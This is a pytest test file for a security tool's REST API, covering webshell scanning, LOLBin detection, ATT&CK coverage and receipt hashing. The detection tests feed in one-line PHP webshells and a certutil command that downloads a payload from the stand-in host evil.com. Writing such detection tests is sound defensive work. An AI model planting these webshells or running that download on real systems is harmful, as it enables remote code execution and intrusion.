"""
tests/unit/test_api_server.py
Tests for Shadow313 NEXUS FastAPI REST API server
"""
from __future__ import annotations
import pytest

# Skip entire module if fastapi not installed
pytest.importorskip("fastapi")
pytest.importorskip("uvicorn")

from fastapi.testclient import TestClient
from shadow313.api.server import create_app
from shadow313 import __version__


# ── Fixtures ──────────────────────────────────────────────────────

@pytest.fixture
def client():
    app = create_app(api_key=None)
    return TestClient(app)

@pytest.fixture
def auth_client():
    app = create_app(api_key="test-key-313")
    return TestClient(app)


# ── Health / Status ───────────────────────────────────────────────

class TestHealth:
    def test_health_endpoint(self, client):
        r = client.get("/health")
        assert r.status_code == 200
        assert r.json()["status"] == "ok"

    def test_status_endpoint(self, client):
        r = client.get("/api/status")
        assert r.status_code == 200
        data = r.json()
        assert data["status"]  == "operational"
        assert data["version"] == __version__
        assert data["service"] == "shadow313-nexus-api"
        assert "timestamp" in data
        assert "modules"   in data

    def test_status_modules_present(self, client):
        r = client.get("/api/status")
        modules = r.json()["modules"]
        assert modules["webshell"]   is True
        assert modules["detection"]  is True
        assert modules["quantum"]    is True

    def test_docs_available(self, client):
        r = client.get("/api/docs")
        assert r.status_code == 200

    def test_openapi_available(self, client):
        r = client.get("/api/openapi.json")
        assert r.status_code == 200
        data = r.json()
        assert data["info"]["title"] == "Shadow313 NEXUS API"


# ── Modules ───────────────────────────────────────────────────────

class TestModules:
    def test_list_modules(self, client):
        r = client.get("/api/modules")
        assert r.status_code == 200
        modules = r.json()["modules"]
        assert len(modules) >= 9
        names = [m["name"] for m in modules]
        assert "recon"   in names
        assert "vuln"    in names
        assert "quantum" in names
        assert "defense" in names

    def test_modules_have_required_fields(self, client):
        r = client.get("/api/modules")
        for m in r.json()["modules"]:
            assert "name"    in m
            assert "version" in m
            assert "status"  in m


# ── Detection ─────────────────────────────────────────────────────

class TestDetection:
    def test_detect_webshell_event(self, client):
        r = client.post("/api/detect", json={
            "event": {
                "event_type": "file_create",
                "file_path":  "/var/www/html/uploads/shell.php",
                "content":    "<?php @eval($_POST['cmd']); ?>",
            },
            "detectors": ["webshell"]
        })
        assert r.status_code == 200
        data = r.json()
        assert "webshell" in data["results"]
        assert data["results"]["webshell"]["detected"] is True
        assert data["results"]["webshell"]["score"] >= 0.65

    def test_detect_clean_event(self, client):
        r = client.post("/api/detect", json={
            "event": {
                "event_type": "http_request",
                "file_path":  "/index.html",
                "http_method": "GET",
            },
            "detectors": ["webshell"]
        })
        assert r.status_code == 200
        data = r.json()
        assert data["results"]["webshell"]["detected"] is False

    def test_detect_lolbin_event(self, client):
        r = client.post("/api/detect", json={
            "event": {
                "event_type":   "process_creation",
                "process":      "certutil.exe",
                "command_line": "certutil.exe -urlcache -f http://evil.com/payload.exe",
            },
            "detectors": ["lolbin"]
        })
        assert r.status_code == 200
        data = r.json()
        assert "lolbin" in data["results"]

    def test_detect_all_detectors(self, client):
        r = client.post("/api/detect", json={
            "event": {"event_type": "test"},
            "detectors": ["all"]
        })
        assert r.status_code == 200
        assert "results" in r.json()

    def test_detect_returns_timestamp(self, client):
        r = client.post("/api/detect", json={
            "event": {},
            "detectors": ["webshell"]
        })
        assert "timestamp" in r.json()


# ── WebShell Scan ─────────────────────────────────────────────────

class TestWebShellScan:
    def test_scan_china_chopper(self, client):
        r = client.post("/api/webshell/scan", json={
            "content":   "<?php @eval($_POST['cmd']); ?>",
            "file_path": "uploads/shell.php",
            "mode":      "content"
        })
        assert r.status_code == 200
        data = r.json()
        assert data["detected"]       is True
        assert data["technique"]      == "T1505.003"
        assert data["finding_count"]  >= 1

    def test_scan_access_log(self, client):
        r = client.post("/api/webshell/scan", json={
            "content": '10.0.0.1 - - [01/Jan/2026] "POST /shell.php HTTP/1.1" 200 512 "-" "antSword/2.1"',
            "mode":    "access_log"
        })
        assert r.status_code == 200
        assert r.json()["detected"] is True

    def test_scan_clean_content(self, client):
        r = client.post("/api/webshell/scan", json={
            "content": "<?php echo 'Hello World'; ?>",
            "mode":    "content"
        })
        assert r.status_code == 200
        assert r.json()["detected"] is False

    def test_scan_returns_findings(self, client):
        r = client.post("/api/webshell/scan", json={
            "content": "<?php system($_GET['cmd']); ?>",
            "mode":    "content"
        })
        data = r.json()
        assert "findings"   in data
        assert "score"      in data
        assert "timestamp"  in data


# ── ATT&CK Coverage ───────────────────────────────────────────────

class TestATTCKCoverage:
    def test_coverage_endpoint(self, client):
        r = client.get("/api/attck/coverage")
        assert r.status_code == 200
        data = r.json()
        assert data["overall_pct"]        >= 50.0
        assert data["techniques_covered"] >= 100
        assert "tactics"    in data
        assert "timestamp"  in data

    def test_coverage_tactics_present(self, client):
        r = client.get("/api/attck/coverage")
        tactics = r.json()["tactics"]
        assert "Execution"           in tactics
        assert "Defense Evasion"     in tactics
        assert "Command and Control" in tactics

    def test_coverage_tactic_fields(self, client):
        r = client.get("/api/attck/coverage")
        for tactic, data in r.json()["tactics"].items():
            assert "covered" in data
            assert "total"   in data
            assert "pct"     in data
            assert data["pct"] == round(data["covered"] / data["total"] * 100, 1)


# ── 313-BIND Receipts ─────────────────────────────────────────────

class TestBindReceipts:
    def test_create_receipt(self, client):
        r = client.post("/api/bind/create", json={
            "payload":  {"event": "test", "score": 0.95},
            "metadata": {"source": "unit_test"}
        })
        assert r.status_code == 200
        data = r.json()
        assert data["bind_id"].startswith("313-API-")
        assert str(data["timestamp_ns"]).endswith("313")
        assert "sha3_256:" in data["payload_hash"]
        assert "sha3_512:" in data["chain_hash"]
        assert "timestamp_iso" in data

    def test_retrieve_receipt(self, client):
        # Create first
        r1 = client.post("/api/bind/create", json={"payload": {"x": 1}})
        bind_id = r1.json()["bind_id"]

        # Retrieve
        r2 = client.get(f"/api/bind/{bind_id}")
        assert r2.status_code == 200
        assert r2.json()["bind_id"] == bind_id

    def test_receipt_not_found(self, client):
        r = client.get("/api/bind/313-API-NOTEXIST")
        assert r.status_code == 404

    def test_list_receipts(self, client):
        client.post("/api/bind/create", json={"payload": {"a": 1}})
        client.post("/api/bind/create", json={"payload": {"b": 2}})
        r = client.get("/api/bind")
        assert r.status_code == 200
        data = r.json()
        assert data["count"] >= 2
        assert "receipts" in data

    def test_chain_hash_changes(self, client):
        r1 = client.post("/api/bind/create", json={"payload": {"seq": 1}})
        r2 = client.post("/api/bind/create", json={"payload": {"seq": 2}})
        assert r1.json()["chain_hash"] != r2.json()["chain_hash"]

    def test_timestamp_ends_in_313(self, client):
        for _ in range(5):
            r = client.post("/api/bind/create", json={"payload": {"t": "test"}})
            ts = str(r.json()["timestamp_ns"])
            assert ts.endswith("313"), f"Timestamp {ts} does not end in 313"


# ── Auth ──────────────────────────────────────────────────────────

class TestAuth:
    def test_no_auth_required_when_no_key_set(self, client):
        r = client.get("/api/modules")
        assert r.status_code == 200

    def test_valid_api_key_accepted(self, auth_client):
        r = auth_client.get("/api/modules",
                            headers={"X-API-Key": "test-key-313"})
        assert r.status_code == 200

    def test_invalid_api_key_rejected(self, auth_client):
        r = auth_client.get("/api/modules",
                            headers={"X-API-Key": "wrong-key"})
        assert r.status_code == 401

    def test_missing_api_key_rejected(self, auth_client):
        r = auth_client.get("/api/modules")
        assert r.status_code == 401


# ── CORS ──────────────────────────────────────────────────────────

class TestCORS:
    def test_cors_headers_present(self, client):
        r = client.options("/api/status",
                           headers={"Origin": "http://localhost:3000",
                                    "Access-Control-Request-Method": "GET"})
        # TestClient may not fully simulate CORS preflight but middleware is registered
        assert r.status_code in (200, 204, 405)
